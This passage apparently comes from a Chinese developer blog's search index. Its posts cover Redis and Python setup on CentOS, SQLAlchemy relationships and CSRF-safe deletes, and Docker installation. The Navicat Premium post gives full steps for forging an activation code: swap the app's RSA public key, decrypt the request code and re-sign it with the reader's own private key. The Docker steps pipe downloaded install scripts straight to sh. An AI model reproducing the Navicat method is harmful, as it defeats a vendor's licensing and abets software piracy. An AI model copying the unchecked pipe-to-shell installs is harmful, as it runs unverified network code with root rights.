        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>Flask-RESTPlus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7.2安装redis]]></title>
    <url>%2F2019%2F12%2F31%2FCentOS%207.2%E5%AE%89%E8%A3%85redis%2F</url>
    <content type="text"><![CDATA[安装# yum -y install redis 常用命令(1)查看安装版本:使用服务端命令：redis-server --version 和 redis-server -v 使用客户端命令：redis-cli --version 和 redis-cli -v 因为redis 的server 与 cli 同时安装，所以二者查出的结果基本一致 (2)启动，停止，重启service redis start|stop|restart (3)开启远程连接修改redis.conf配置文件，把bind=127.0.0.1注释掉(如果想设置密码在redis.conf中加上requirepass:密码即可) 安全建议1、Redis本身防护(1)修改Redis默认端口，将默认的6379端口修改为其他端口； (2)增加Redis用户名和密码，Redis使用普通用户权限，禁止使用 root 权限启动Redis 服务，这样可以保证在存在漏洞的情况下攻击者也只能获取到普通用户权限，无法获取root权限；设置密码访问认证，可通过修改redis.conf配置文件中的&quot;requirepass&quot; 设置复杂密码 （需要重启Redis服务才能生效）； (3)在Redis绑定指定IP访问(位置配置文件[redis.config]中的bind节点) (4)禁用config指令避免恶意操作，在Redis配置文件redis.conf中配置rename-command项&quot;RENAME_CONFIG&quot;，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度； 2、Linux服务器(1)Redis服务器不要暴露在外网，禁止Redis服务对公网开放，可通过修改redis.conf配置文件中的&quot;#bind 127.0.0.1&quot; ，去掉前面的&quot;#&quot;即可（Redis本来就是作为内存数据库，只要监听在本机即可）； (2)开启防火墙，限制IP可以访问(iptables命令)，对访问源IP进行访问控制，可在防火墙限定指定源ip才可以连接Redis服务器； (3)用容器（如Docker等）管理起服务器，这样中病毒后排查不出原因需要重新装环境的时候影响小并且可以快速恢复。 redis客户端Redis桌面管理工具：Redis Desktop Manager，下载地址：http://down-www.newasp.net/pcdown/soft/dys/redis.desktop.manager.exe]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7.2安装Python3.7]]></title>
    <url>%2F2019%2F12%2F31%2FCentOS%207.2%E5%AE%89%E8%A3%85Python3.7%2F</url>
    <content type="text"><![CDATA[系统环境• CentOS 7.3 x86_64 操作步骤安装依赖包# yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make libffi-devel 下载 Python 3.7.1源码包# wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tar.xz 解压到指定目录# tar xf Python-3.7.1.tar.xz -C /usr/local/src/ (yum -y install xz #若失败,重建yum缓存.yum clean all ,yum makecache) 开始安装# cd /usr/local/src/Python-3.7.1 # ./configure --prefix=/usr/local/python3 # make &amp;&amp; make install 说明：从 Python 3.4 开始就已经自带了 pip 和 easy_install（setuptools 包带的命令） 包管理命令，可以在 /usr/local/python3/bin/ 目录下看到，查看一下已经安装的扩展包： #/usr/local/python3/bin/pip3 list pip (8.1.1) setuptools (20.10.1) You are using pip version 8.1.1, however version 8.1.2 is available. You should consider upgrading via the &apos;pip install --upgrade pip&apos; command. 更新pip #/usr/local/python3/bin/pip3 install --upgrade pip 添加软连接# ln -s /usr/local/python3/bin/python3 /usr/bin/python3 # ln -s /usr/local/python3/bin/pip3 /usr/bin/pip3 验证# python3 -V # pip3 list]]></content>
      <categories>
        <category>CentOS</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac版 Navicat Premium]]></title>
    <url>%2F2019%2F07%2F22%2FMac%E7%89%88%20Navicat%20Premium%2F</url>
    <content type="text"><![CDATA[Mac版 Navicat Premium 下载地址(请使用分享链接下载)：英文版在线生成非对称加密公钥私钥对 – 密钥是2048位的，PKCS#8格式1.下载软件Mac版 Navicat Premium 下载地址(请使用分享链接下载，其他方式下载的软件不知道能不能用)：英文版2.生成密钥打开如下链接的网站，在线生成非对称加密公钥私钥对生成密钥位数：2048位的，密钥格式：PKCS#8，证书密码为空，然后点击生成密钥对。把生成的非对称加密公钥和非对称加密私钥保存起来。3.安装软件，修改公钥文件内容安装软件，然后在finder中找到应用程序，右键Navicat Premium.app ,打开目录 /Contents/Resources，先复制保存一份，然后再编辑rpk文件，用自己生成的或者本人提供的公钥替换并保存(重点)。4.激活，生成激活码接下来断网，然后打开navicat, 根据navicat输入以下序列号：英文版64位密钥序列号： NAVG-UJ8Z-EVAP-JAUW如果右边出现 ✔️，继续。如果右边是黑色的❌,重来。由于断了网，则会出现手动激活的按钮（左边第一个），点击手动激活会出现请求码。登录在线生成非对称加密公钥私钥对， 填充方式为PKCS1_PADDING，私钥密码为空，字符集为gb2312编码。在第一个输入框 输入加密私钥（以“—–BEGIN PRIVATE KEY—–”开头 “—–END PRIVATE KEY—–” 结尾）中 填上第一步生成的非对称加密私钥在第三个输入框 RSA私钥加密、解密转换结果(base64了) 填上请求码（navicat中出现的）点击RSA私钥解密此时会在第二个输入框待加密、解密的文本会生成请求码明文。大致是如下格式：12345&#123; &quot;K&quot; : &quot;NAVGUJ8ZEVAPJAUW&quot;, &quot;P&quot; : &quot;Mac 10.14&quot;, &quot;DI&quot; : &quot;NDljYjY4ZWMzZTQ4MjRm&quot;&#125;接下来需要给这个请求码明文增加内容：获取当前时间戳 时间戳转换，用T表示输入所在公司和组织，用N和O表示最终样式如下：12345678&#123; &quot;K&quot; : &quot;NAVGUJ8ZEVAPJAUW&quot;, &quot;P&quot; : &quot;Mac 10.14&quot;, &quot;DI&quot; : &quot;NDljYjY4ZWMzZTQ4MjRm&quot;, &quot;N&quot;:&quot;52pojie&quot;, &quot;O&quot;:&quot;52pojie.cn&quot;, &quot;T&quot;:1563413356&#125;然后在第二个输入框待加密、解密的文本中输入该请求码明文，点击RSA私钥加密，最后会在第三个输入框 RSA私钥加密、解密转换结果(base64了) 上显示出激活码，复制该激活码，粘贴到navicat中，激活即可。]]></content>
      <categories>
        <category>Mac</category>
        <category>Navicat Premium</category>
      </categories>
      <tags>
        <tag>Mac</tag>
        <tag>Navicat Premium</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLAlchemy知识补充]]></title>
    <url>%2F2019%2F07%2F22%2FSQLAlchemy%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85-md%2F</url>
    <content type="text"><![CDATA[SQLite的数据库URI在Linux或macOS系统下的斜线数量是4个；在Windows系统下的URI中的斜线数量为3个。内存型数据库的斜线固定为3个。常用的SQLAlchemy字段参数中，index如果设置为True，则表示为该字段创建索引通过ORM模型查看对应的SQL建表语句123456789101112131415161718192021222324252627282930#!/usr/bin/env python# -*- coding: utf-8 -*-# app.pyfrom flask import Flaskfrom flask_sqlalchemy import SQLAlchemyimport osapp = Flask(__name__)app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv('DATABASE_URL', 'sqlite:///' + os.path.join(app.root_path, 'data.db'))app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = Falsedb = SQLAlchemy(app)class Note(db.Model): __tablename__ = 'note' id = db.Column(db.Integer, primary_key=True, autoincrement=True) body = db.Column(db.Text)@app.route('/')def index(): return '1'if __name__ == '__main__': app.run(debug=True)123456789&gt;&gt;&gt; from app import db,Note&gt;&gt;&gt; from sqlalchemy.schema import CreateTable&gt;&gt;&gt; print(CreateTable(Note.__table__))CREATE TABLE note ( id INTEGER NOT NULL, body TEXT, PRIMARY KEY (id))filter与filter_by查询方法的区别1234# filterNote.query.filter(Note.body=='SHAVE').first()## filter_byNote.query.filter_by(body='SHAVE').first()编辑操作当我们渲染表单字段时，如果表单字段的data属性不为空，WTForms会自动把data属性的值添加到表单字段的value属性中，作为表单的值填充进去，我们不用手动为value属性赋值。因此，将存储笔记原有内容的note.body属性赋值给表单body字段的data属性即可在页面上的表单中填入原有的内容。12345678910# index.html&lt;a class="btn" href="&#123;&#123; url_for('edit_note', note_id=note.id) &#125;&#125;"&gt;Edit&lt;/a&gt;#edit_note.html&lt;h2&gt;Edit Note&lt;/h2&gt;&lt;form method="post"&gt; &#123;&#123; form.csrf_token &#125;&#125; &#123;&#123; form_field(form.body, rows=5, cols=50) &#125;&#125; &#123;&#123; form.submit &#125;&#125;&lt;/form&gt;12345678910111213141516class EditNoteForm(FlaskForm): body = TextAreaField('Body', validators=[DataRequired()]) submit = SubmitField('Update') @app.route('/edit/&lt;int:note_id&gt;', methods=['GET', 'POST'])def edit_note(note_id): form = EditNoteForm() note = Note.query.get(note_id) if form.validate_on_submit(): note.body = form.body.data db.session.commit() flash('Your note is updated.') return redirect(url_for('index')) form.body.data = note.body return render_template('edit_note.html', form=form)正常且安全的删除操作：大多数人通常会考虑在笔记内容下添加一个删除链接：href12345678910id) &#125;&#125;&quot;&gt;Delete&lt;/a&gt;```，这个链接指向用来删除笔记的delete_note视图：```python@app.route(&apos;/delete/&lt;int:note_id&gt;&apos;)def delete_note(note_id): note = Note.query.get(note_id) db.session.delete(note) db.session.commit() flash(&apos;Your note is deleted.&apos;) return redirect(url_for(&apos;index&apos;))但这种处理方式实际上会使程序处于CSRF攻击的风险之中。防范CSRF攻击的基本原则就是正确使用GET和POST方法。像删除这类修改数据的操作绝对不能通过GET请求实现，正确的做法是为删除操作创建一个表单：12class DeleteNoteForm(FlaskForm): submit = SubmitField('Delete')这个表单类只有一个提交字段，只需要在页面上显示一个删除按钮来提交表单。删除表单的提交请求由delete_note视图处理:1234567891011@app.route('/delete/&lt;int:note_id&gt;', methods=['POST'])def delete_note(note_id): form = DeleteNoteForm() if form.validate_on_submit(): note = Note.query.get(note_id) # 获取对应记录 db.session.delete(note) # 删除记录 db.session.commit() # 提交修改 flash('Your note is deleted.') else: abort(400) return redirect(url_for('index'))html页面如下：1234&lt;form method="post" action="&#123;&#123; url_for('delete_note', note_id=note.id) &#125;&#125;"&gt; &#123;&#123; form.csrf_token &#125;&#125; &#123;&#123; form.submit(class='btn') &#125;&#125;&lt;/form&gt;表单的action属性设置为删除当前笔记的URL。构建URL时，URL变量note_id的值通过note.id属性获取，当单击提交按钮时，会将请求发送到action属性中的URL。添加删除表单的主要目的就是防止CSRF攻击，所以不要忘记渲染CSRF令牌字段form.csrf_token。一对多关系Author类用来表示作者，Article类用来表示文章，一个作者可以有多篇文章123456789101112131415class Author(db.Model): __tablename__ = 'author' id = db.Column(db.Integer, primary_key=True, autoincrement=True) name = db.Column(db.String(70), unique=True) phone = db.Column(db.String(20)) articles = db.relationship('Article')class Article(db.Model): __tablename__ = 'article' id = db.Column(db.Integer, primary_key=True, autoincrement=True) title = db.Column(db.String(50), index=True) body = db.Column(db.Text) author_id = db.Column(db.Integer, db.ForeignKey('author.id'))(1) 定义外键外键只能存储单一数据（标量），所以外键总是在“多”这一侧定义。定义一个author_id字段作为外键，使用db.ForeignKey类定义为外键，传入关系另一侧的表名和主键字段名，即author.id。实际的效果是将article表的author_id的值限制为author表的id列的值。外键字段的命名没有限制。(2) 定义关系属性关系属性在关系的出发侧定义，即一对多关系的“一”这一侧。定义了一个articles属性来表示对应的多篇文章。关系属性的名称没有限制，可以自由修改。它相当于一个快捷查询，不会作为字段写入数据库中。这个属性并没有使用Column类声明为列，而是使用了db.relationship（）关系函数定义为关系属性，因为这个关系属性返回多个记录，我们称之为集合关系属性。relationship（）函数的第一个参数为关系另一侧的模型名称，它会告诉SQLAlchemy将Author类与Article类建立关系。当这个关系属性被调用时，SQLAlchemy会找到关系另一侧（即article表）的外键字段（即author_id），然后反向查询article表中所有author_id值为当前表主键值（即author.id）的记录，返回包含这些记录的列表，也就是返回某个作者对应的多篇文章记录。( 3 ) 示例1234567891011# 添加数据&gt;&gt;&gt; foo = Author(name='Foo')&gt;&gt;&gt; spam = Article(title='Spam')&gt;&gt;&gt; ham = Article(title='Ham')&gt;&gt;&gt; db.session.add(foo)&gt;&gt;&gt; db.session.add(spam)&gt;&gt;&gt; db.session.add(ham)&gt;&gt;&gt; foo.articles.append(spam)&gt;&gt;&gt; foo.articles.append(ham)&gt;&gt;&gt; db.session.commit()对关系属性调用remove（）方法可以与对应的Aritcle对象解除关系：12&gt;&gt;&gt; foo.articles.remove(ham)&gt;&gt;&gt; db.session.commit()（4）建立双向关系在某些情况下，也许希望能在Article类中定义一个类似的author关系属性，当被调用时返回对应的作者记录，这类返回单个值的关系属性被称为标量关系属性。而这种两侧都添加关系属性获取对方记录的关系我们称之为双向关系。通过在关系的另一侧也创建一个relationship（）函数，就可以在两个表之间建立双向关系。12345678910111213class Writer(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(70), unique=True) books = db.relationship('Book', back_populates='writer') class Book(db.Model): id = db.Column(db.Integer, primary_key=True) title = db.Column(db.String(50), index=True) writer_id = db.Column(db.Integer, db.ForeignKey('writer.id')) writer = db.relationship('Writer', back_populates='books')多对一关系Ctizen类表示居民，City类表示城市。在多对一关系中外键和关系属性都定义在“多”这一侧，即City类中。12345678910class Citizen(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(70), unique=True) city_id = db.Column(db.Integer, db.ForeignKey('city.id')) city = db.relationship('City') class City(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(30), unique=True)一对一关系Cuntry类表示国家，Capital类表示首都。一对一关系实际上是通过建立双向关系的一对多关系的基础上转化而来。在定义集合属性的关系函数中将uselist参数设为False，这时一对多关系将被转换为一对一关系。“多”这一侧本身就是标量关系属性，不用做任何改动。而“一”这一侧的集合关系属性，通过将uselist设为False后，将仅返回对应的单个记录，而且无法再使用列表语义操作.123456789101112class Country(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(30), unique=True) capital = db.relationship('Capital', uselist=False) class Capital(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(30), unique=True) country_id = db.Column(db.Integer, db.ForeignKey('country.id')) country = db.relationship('Country')多对多关系Sudent类表示学生，Teacher类表示老师。在多对多关系中，每一个记录都可以与关系另一侧的多个记录建立关系，关系两侧的模型都需要存储一组外键。除了关系两侧的模型外，还需要创建一个关联表。关联表不存储数据，只用来存储关系两侧模型的外键对应关系。关联表使用db.Table类定义，传入的第一个参数是关联表的名称。关联表中定义了两个外键字段：teacher_id字段存储Teacher类的主键，student_id存储Student类的主键。借助关联表这个中间人存储的外键对，可以把多对多关系分化成两个一对多关系.对关系属性使用append（）方法即可。如果你想要解除关系，那么可以使用remove（）方法。关联表由SQLAlchemy接管，它会帮我们管理这个表：我们只需要像往常一样通过操作关系属性来建立或解除关系，SQLAlchemy会自动在关联表中创建或删除对应的关联表记录，而不用手动操作关联表。12345678910111213141516association_table = db.Table('association', db.Column('student_id', db.Integer, db.ForeignKey('student.id')), db.Column('teacher_id', db.Integer, db.ForeignKey('teacher.id')))class Student(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(70), unique=True) grade = db.Column(db.String(20)) teachers = db.relationship('Teacher',secondary=association_table,back_populates='students') class Teacher(db.Model): id = db.Column(db.Integer, primary_key=True) name = db.Column(db.String(70), unique=True) office = db.Column(db.String(20))常用的SQLAlchemy关系函数参数常用的SQLAlchemy关系记录加载方式（lazy参数可选值）dynamic选项仅用于集合关系属性，不可用于多对一、一对一或是在关系函数中将uselist参数设为False的情况。级联操作Cascade意为“级联操作”，就是在操作一个对象的同时，对相关的对象也执行某些操作。通过一个Post模型和Comment模型来演示级联操作，分别表示文章（帖子）和评论，两者为一对多关系：12345678910111213class Post(db.Model): id = db.Column(db.Integer, primary_key=True) title = db.Column(db.String(50), unique=True) body = db.Column(db.Text) comments = db.relationship('Comment', back_populates='post',cascade='save-update, merge, delete') class Comment(db.Model): id = db.Column(db.Integer, primary_key=True) body = db.Column(db.Text) post_id = db.Column(db.Integer, db.ForeignKey('post.id')) post = db.relationship('Post', back_populates='comments')级联行为通过关系函数relationship（）的cascade参数设置。设置了cascade参数的一侧将被视为父对象，相关的对象则被视为子对象。cascade通常使用多个组合值，级联值之间使用逗号分隔，123class Post(db.Model): ... comments = db.relationship('Comment', back_populates='post',cascade='save-update, merge, delete')常用的配置组合如下所示：save-update、merge（默认值）save-update、merge、deleteallall、delete-orphan当没有设置cascade参数时，会使用默认值save-update、merge。all等同于除了delete-orphan以外所有可用值的组合，即save-update、merge、refresh-expire、expunge、delete。(1) save-updatesave-update是默认的级联行为，当cascade参数设为save-update时，如果使用db.session.add（）方法将Post对象添加到数据库会话时，那么与Post相关联的Comment对象也将被添加到数据库会话。(2) delete如果某个Post对象被删除，那么按照默认的行为，该Post对象相关联的所有Comment对象都将与这个Post对象取消关联，外键字段的值会被清空。如果Post类的关系函数中cascade参数设为delete时，这些相关的Comment会在关联的Post对象删除时被一并删除。当需要设置delete级联时，我们会将级联值设为all或save-update、merge、delete。123class Post(db.Model): ... comments = db.relationship('Comment', back_populates='post',cascade='all')(3) delete-orphandelete-orphan基于delete级联的，必须和delete级联一起使用，通常会设为all、delete-orphan，因为all包含delete。因此当cascade参数设为delete-orphan时，它首先包含delete级联的行为：当某个Post对象被删除时，所有相关的Comment对象都将被删除（delete级联）。除此之外，当某个Post对象（父对象）与某个Comment对象（子对象）解除关系时，也会删除该Comment对象，这个解除关系的对象被称为孤立对象（orphan object）.123class Post(db.Model): ... comments = db.relationship('Comment', back_populates='post',cascade='all,delete-orphan')delete和delete-orphan通常会在一对多关系模式中，而且“多”这一侧的对象附属于“一”这一侧的对象时使用。尤其是如果“一”这一侧的“父”对象不存在了，那么“多”这一侧的“子”对象不再有意义的情况。事件监听SQLAlchemy也提供了一个listen_for（）装饰器，它可以用来注册事件回调函数。listen_for（）装饰器主要接收两个参数，target表示监听的对象，这个对象可以是模型类、类实例或类属性等。identifier参数表示被监听事件的标识符，比如，用于监听属性的事件标识符有set、append、remove、init_scalar、init_collection等。123456789class Draft(db.Model): id = db.Column(db.Integer, primary_key=True) body = db.Column(db.Text) edit_time = db.Column(db.Integer, default=0) @db.event.listens_for(Draft.body, 'set')def increment_edit_time(target, value, oldvalue, initiator): if target.edit_time is not None: target.edit_time += 1listen_for（）装饰器中分别传入Draft.body和set作为targe和identifier参数的值。监听函数接收所有set（）事件方法接收的参数，其中的target参数表示触发事件的模型类实例，使用target.edit_time即可获取我们需要叠加的字段。其他的参数也需要照常写出，虽然这里没有用到。value表示被设置的值，oldvalue表示被取代的旧值。当set事件发生在目标对象Draft.body上时，这个监听函数就会被执行，从而自动叠加Draft.edit_time列的值123456789101112131415&gt;&gt;&gt; draft = Draft(body='init')&gt;&gt;&gt; db.session.add(draft)&gt;&gt;&gt; db.session.commit()&gt;&gt;&gt; draft.edit_time0&gt;&gt;&gt; draft.body = 'edited'&gt;&gt;&gt; draft.edit_time1&gt;&gt;&gt; draft.body = 'edited again'&gt;&gt;&gt; draft.edit_time2&gt;&gt;&gt; draft.body = 'edited again again'&gt;&gt;&gt; draft.edit_time3&gt;&gt;&gt; db.session.commit()还有一种更简单的方法。通过在listen_for（）装饰器中将关键字参数name设为True，可以在监听函数中接收**kwargs作为参数（可变长关键字参数），即“named argument”。然后在函数中可以使用参数名作为键来从**kwargs字典获取对应的参数值：1234@db.event.listens_for(Draft.body, 'set', named=True)def increment_edit_time(**kwargs): if kwargs['target'].edit_time is not None: kwargs['target'].edit_time += 1]]></content>
      <categories>
        <category>SQLAlchemy</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>SQLAlchemy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker教程]]></title>
    <url>%2F2019%2F07%2F15%2FDocker%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Docker简介基于菜鸟教程自己亲自实践一遍，把教程中有误的步骤改正过来，方便自己后期查看使用Docker 介绍Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。Docker 从 17.03 版本之后分为 CE（Community Edition: 社区版） 和 EE（Enterprise Edition: 企业版），我们用社区版就可以了。Docker 的应用场景Web 应用的自动化打包和发布。自动化测试和持续集成、发布。在服务型环境中部署和调整数据库或其他的后台应用。从头编译或者扩展现有的 OpenShift 或 Cloud Foundry 平台来搭建自己的 PaaS 环境。Docker 的优点简化程序Docker 让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，便可以实现虚拟化。Docker改变了虚拟化的方式，使开发者可以直接将自己的成果放入Docker中进行管理。方便快捷已经是 Docker的最大优势，过去需要用数天乃至数周的 任务，在Docker容器的处理下，只需要数秒就能完成。避免选择恐惧症如果你有选择恐惧症，还是资深患者。那么你可以使用 Docker 打包你的纠结！比如 Docker 镜像；Docker 镜像中包含了运行环境和配置，所以 Docker 可以简化部署多种应用实例工作。比如 Web 应用、后台应用、数据库应用、大数据应用比如 Hadoop 集群、消息队列等等都可以打包成一个镜像部署。节省开支一方面，云计算时代到来，使开发者不必为了追求效果而配置高额的硬件，Docker 改变了高性能必然高价格的思维定势。Docker 与云的结合，让云空间得到更充分的利用。不仅解决了硬件管理的问题，也改变了虚拟化的方式。Docker 架构Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。Docker面向对象容器对象镜像类Docker 镜像(Images)Docker 镜像是用于创建 Docker 容器的模板。Docker 容器(Container)容器是独立运行的一个或一组应用。Docker 客户端(Client)Docker 客户端通过命令行或者其他工具使用 Docker API (https://docs.docker.com/reference/api/docker_remote_api) 与 Docker 的守护进程通信。Docker 主机(Host)一个物理或者虚拟的机器用于执行 Docker 守护进程和容器。Docker 仓库(Registry)Docker 仓库用来保存镜像，可以理解为代码控制中的代码仓库。 Docker Hub(https://hub.docker.com) 提供了庞大的镜像集合供使用。Docker MachineDocker Machine是一个简化Docker安装的命令行工具，通过一个简单的命令行即可在相应的平台上安装Docker，比如VirtualBox、 Digital Ocean、Microsoft Azure。Docker 安装Ubuntu Docker 安装Docker 支持以下的 Ubuntu 版本：Ubuntu Precise 12.04 (LTS)Ubuntu Trusty 14.04 (LTS)Ubuntu Wily 15.10Xenial 16.04 (LTS)其他更新的版本……如果安装 Docker ce 需要 16.04 及以上版本，安装步骤可以查看笔记部分：Cosmic 18.10Bionic 18.04 (LTS)Xenial 16.04 (LTS)前提条件Docker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。通过 uname -r 命令查看你当前的内核版本：1$ uname -r使用脚本安装 Docker获取最新版本的 Docker 安装包1$ wget -qO- https://get.docker.com/ | sh输入当前用户的密码后，就会下载脚本并且安装Docker及依赖包。安装完成后有个提示：12345 If you would like to use Docker as a non-root user, you should now consider adding your user to the &quot;docker&quot; group with something like: sudo usermod -aG docker runoobRemember that you will have to log out and back in for this to take effect!当要以非root用户可以直接运行docker时，需要执行 sudo usermod -aG docker runoob 命令，然后重新登陆，否则会有如下报错：启动docker 后台服务1$ sudo service docker start测试运行hello-world1$ docker run hello-world镜像加速鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：http://hub-mirror.c.163.com。新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\docker\config\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：123&#123; "registry-mirrors": ["http://hub-mirror.c.163.com"]&#125;Ubuntu 16.04 安装 Docker1.选择国内的云服务商，这里选择阿里云为例1curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh -2.安装所需要的包1sudo apt-get install linux-image-extra-$(uname -r) linux-image-extra-virtual3.添加使用 HTTPS 传输的软件包以及 CA 证书12sudo apt-get updatesudo apt-get install apt-transport-https ca-certificates4.添加GPG密钥1sudo apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D5.添加软件源1echo "deb https://apt.dockerproject.org/repo ubuntu-xenial main" | sudo tee /etc/apt/sources.list.d/docker.list6.添加成功后更新软件包缓存1sudo apt-get update7.安装docker1sudo apt-get install docker-engine8.启动 docker12sudo systemctl enable dockersudo systemctl start dockerUbuntu 18.04 安装 Docker-ce1.更换国内软件源，推荐中国科技大学的源，稳定速度快（可选）123sudo cp /etc/apt/sources.list /etc/apt/sources.list.baksudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.listsudo apt update2.安装需要的包1sudo apt install apt-transport-https ca-certificates software-properties-common curl3.添加 GPG 密钥，并添加 Docker-ce 软件源，这里还是以中国科技大学的 Docker-ce 源为例123curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository "deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \$(lsb_release -cs) stable"4.添加成功后更新软件包缓存1sudo apt update5.安装 Docker-ce1sudo apt install docker-ce6.设置开机自启动并启动 Docker-ce（安装成功后默认已设置并启动，可忽略）12sudo systemctl enable dockersudo systemctl start docker7.测试运行1sudo docker run hello-world8.添加当前用户到 docker 用户组，可以不用 sudo 运行 docker（可选）12sudo groupadd dockersudo usermod -aG docker $USER9.测试添加用户组（可选）1docker run hello-worldCentOS Docker 安装Docker支持以下的CentOS版本：CentOS 7 (64-bit)CentOS 6.5 (64-bit) 或更高的版本前提条件目前，CentOS 仅发行版本中的内核支持 Docker。Docker 运行在 CentOS 7 上，要求系统为64位、系统内核版本为 3.10 以上。Docker 运行在 CentOS6.5 或更高的版本的 CentOS 上，要求系统为64位、系统内核版本为 2.6.32-431 或者更高版本。使用 yum 安装（CentOS 7下）Docker 要求 CentOS 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的CentOS 版本是否支持 Docker 。通过 uname -r 命令查看你当前的内核版本1# uname -r从 2017 年 3 月开始 docker 在原来的基础上分为两个分支版本: Docker CE 和 Docker EE。Docker CE 即社区免费版，Docker EE 即企业版，强调安全，但需付费使用。本文介绍 Docker CE 的安装使用。移除旧的版本：12345678910$ sudo yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine安装一些必要的系统工具：1sudo yum install -y yum-utils device-mapper-persistent-data lvm2添加软件源信息：1sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoDocker支持以下的CentOS版本：CentOS 7 (64-bit) CentOS 6.5 (64-bit) 或更高的版本 前提条件目前，CentOS 仅发行版本中的内核支持 Docker。Docker 运行在 CentOS 7 上，要求系统为64位、系统内核版本为 3.10 以上。Docker 运行在 CentOS-6.5 或更高的版本的 CentOS 上，要求系统为64位、系统内核版本为 2.6.32-431 或者更高版本。使用 yum 安装（CentOS 7下）Docker 要求 CentOS 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的CentOS 版本是否支持 Docker 。通过 uname -r 命令查看你当前的内核版本[root@runoob ~]# uname -r安装 Docker从 2017 年 3 月开始 docker 在原来的基础上分为两个分支版本: Docker CE 和 Docker EE。Docker CE 即社区免费版，Docker EE 即企业版，强调安全，但需付费使用。本文介绍 Docker CE 的安装使用。移除旧的版本：12345678910# yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-selinux \ docker-engine-selinux \ docker-engine安装一些必要的系统工具：1# yum install -y yum-utils device-mapper-persistent-data lvm2添加软件源信息：1# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo更新 yum 缓存：1# yum makecache fast安装 Docker-ce：1# yum -y install docker-ce启动 Docker 后台服务：1# systemctl start docker.service测试运行 hello-world123456789101112131415161718192021222324252627# docker run hello-worldUnable to find image 'hello-world:latest' locallylatest: Pulling from library/hello-world1b930d010525: Pull complete Digest: sha256:6540fc08ee6e6b7b63468dc3317e3303aae178cb8a45ed3123180328bcc1d20fStatus: Downloaded newer image for hello-world:latestHello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the "hello-world" image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal.To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bashShare images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/由于本地没有hello-world这个镜像，所以会下载一个hello-world的镜像，并在容器内运行。使用脚本安装 Docker使用 sudo 或 root 权限登录 Centos。确保 yum 包更新到最新。1# yum update执行 Docker 安装脚本。12# curl -fsSL https://get.docker.com -o get-docker.sh# sh get-docker.sh执行这个脚本会添加 docker.repo 源并安装 Docker。启动 Docker 进程。1# systemctl start docker.service验证 docker 是否安装成功并在容器中执行一个测试的镜像。12# docker run hello-world# docker ps到此，Docker 在 CentOS 系统的安装完成。镜像加速鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：http://hub-mirror.c.163.com。新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\docker\config\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：123&#123; &quot;registry-mirrors&quot;: 